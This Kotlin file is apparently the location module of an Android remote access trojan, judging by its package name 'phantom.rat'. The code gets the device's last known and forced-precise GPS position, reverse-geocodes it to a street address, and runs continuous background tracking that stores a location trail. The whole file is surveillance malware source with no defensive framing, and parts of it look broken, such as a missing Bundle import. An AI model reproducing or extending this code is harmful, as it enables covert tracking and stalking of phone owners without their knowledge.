package com.phantom.rat.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.os.Build
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.util.*

class LocationModule(private val context: Context) {

    fun getLocation(): JSONObject {
        val result = JSONObject()
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            // Check permissions
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Fine location permission not granted")
                    return result
                }
            }
            
            // Try GPS first, then network
            var location: Location? = null
            
            val gpsProvider = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val networkProvider = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            location = when {
                gpsProvider != null -> gpsProvider
                networkProvider != null -> networkProvider
                else -> null
            }
            
            if (location == null) {
                // Request single update
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, null, null)
                // Fallback to passive
                location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
            }
            
            if (location != null) {
                result.put("status", "success")
                result.put("latitude", location.latitude)
                result.put("longitude", location.longitude)
                result.put("accuracy", location.accuracy)
                result.put("altitude", location.altitude)
                result.put("speed", location.speed)
                result.put("bearing", location.bearing)
                result.put("time", location.time)
                result.put("provider", location.provider)
                
                // Get approximate address from coordinates
                try {
                    val geocoder = Geocoder(context, Locale.getDefault())
                    val addresses = geocoder.getFromLocation(
                        location.latitude, location.longitude, 1
                    )
                    if (addresses != null && addresses.isNotEmpty()) {
                        val address = addresses[0]
                        result.put("address", formatAddress(address))
                        result.put("city", address.locality ?: "")
                        result.put("country", address.countryName ?: "")
                        result.put("postal_code", address.postalCode ?: "")
                        result.put("admin_area", address.adminArea ?: "")
                    }
                } catch (_: Exception) {}
                
            } else {
                result.put("status", "error")
                result.put("message", "Unable to get location. GPS may be disabled.")
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun getPreciseLocation(): JSONObject {
        val result = JSONObject()
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Permission not granted")
                    return result
                }
            }
            
            // Force GPS refresh by requesting updates
            val gpsListener = object : android.location.LocationListener {
                override fun onLocationChanged(location: Location) {
                    synchronized(result) {
                        result.put("latitude", location.latitude)
                        result.put("longitude", location.longitude)
                        result.put("accuracy", location.accuracy)
                        result.put("altitude", location.altitude)
                        result.put("bearing", location.bearing)
                        result.put("speed", location.speed)
                        result.put("time", location.time)
                        result.put("provider", location.provider)
                        result.put("status", "success")
                    }
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                0, 0f, gpsListener, null
            )
            
            // Wait for GPS fix
            Thread.sleep(3000)
            locationManager.removeUpdates(gpsListener)
            
            if (result.optString("status") != "success") {
                // Fallback to last known
                val lastKnown = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (lastKnown != null) {
                    result.put("status", "success")
                    result.put("latitude", lastKnown.latitude)
                    result.put("longitude", lastKnown.longitude)
                    result.put("accuracy", lastKnown.accuracy)
                    result.put("provider", "last_known")
                } else {
                    result.put("status", "error")
                    result.put("message", "Could not get precise GPS location")
                }
            }
            
            // Add address if location found
            if (result.optString("status") == "success") {
                try {
                    val geocoder = Geocoder(context, Locale.getDefault())
                    val addresses = geocoder.getFromLocation(
                        result.optDouble("latitude", 0.0),
                        result.optDouble("longitude", 0.0),
                        1
                    )
                    if (addresses != null && addresses.isNotEmpty()) {
                        val address = addresses[0]
                        result.put("address_line", address.getAddressLine(0) ?: "")
                        result.put("street", address.thoroughfare ?: "")
                        result.put("city", address.locality ?: "")
                        result.put("state", address.adminArea ?: "")
                        result.put("country", address.countryName ?: "")
                        result.put("postal_code", address.postalCode ?: "")
                        result.put("feature_name", address.featureName ?: "")
                        
                        // Get all address lines
                        val lines = JSONArray()
                        for (i in 0..address.maxAddressLineIndex) {
                            lines.put(address.getAddressLine(i))
                        }
                        result.put("address_lines", lines)
                    }
                } catch (_: Exception) {}
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun startContinuousTracking(): JSONObject {
        val result = JSONObject()
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Permission not granted")
                    return result
                }
            }
            
            val locations = mutableListOf<JSONObject>()
            
            val locationListener = object : android.location.LocationListener {
                override fun onLocationChanged(location: Location) {
                    val loc = JSONObject().apply {
                        put("lat", location.latitude)
                        put("lng", location.longitude)
                        put("accuracy", location.accuracy)
                        put("altitude", location.altitude)
                        put("speed", location.speed)
                        put("bearing", location.bearing)
                        put("time", location.time)
                        put("provider", location.provider)
                    }
                    locations.add(loc)
                    
                    // Store in preferences
                    val prefs = context.getSharedPreferences("gps_tracker", Context.MODE_PRIVATE)
                    val existing = prefs.getString("track", "[]") ?: "[]"
                    val arr = org.json.JSONArray(existing)
                    arr.put(loc)
                    prefs.edit().putString("track", arr.toString()).apply()
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                5000, 10f, locationListener, null
            )
            
            result.put("status", "success")
            result.put("message", "Continuous tracking started")
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    private fun formatAddress(address: Address): String {
        val parts = mutableListOf<String>()
        for (i in 0..address.maxAddressLineIndex) {
            address.getAddressLine(i)?.let { parts.add(it) }
        }
        return parts.joinToString(", ")
    }
}
